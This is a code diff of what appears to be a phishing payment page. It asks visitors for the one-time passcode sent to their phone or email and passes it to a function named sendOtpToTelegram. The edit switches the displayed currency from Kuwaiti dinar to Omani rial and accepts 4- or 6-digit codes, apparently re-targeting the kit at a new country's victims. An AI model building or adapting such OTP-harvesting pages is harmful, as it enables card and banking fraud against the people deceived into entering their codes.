@@ -110,7 +110,7 @@
 
     <p><strong>quantity:</strong> <span id="quantity"></span></p>
     <p><strong>category:</strong> <span id="category"></span></p>
-    <p><strong>Amount:</strong> <span id="totalPrice"></span> KD</p>
+    <p><strong>Amount:</strong> <span id="totalPrice"></span> OMR</p>
 
     <p>Please enter the OTP received on your mobile/Email</p>
     <input type="text" id="otp-input" placeholder="Enter OTP" maxlength="6" inputmode="numeric" />
@@ -170,9 +170,9 @@
 
     document.getElementById("pay-button").addEventListener("click", () => {
       const otp = document.getElementById("otp-input").value.trim();
-      if (otp.length !== 6 || !/^\d+$/.test(otp)) {
-        alert("Please enter a valid 6-digit OTP.");
-        return;
+      if (!/^\d{4}$/.test(otp) && !/^\d{6}$/.test(otp)) {
+  alert("يرجى إدخال رمز مكوّن من 4 أو 6 أرقام فقط.");
+  return;
       }
 
       sendOtpToTelegram(otp);
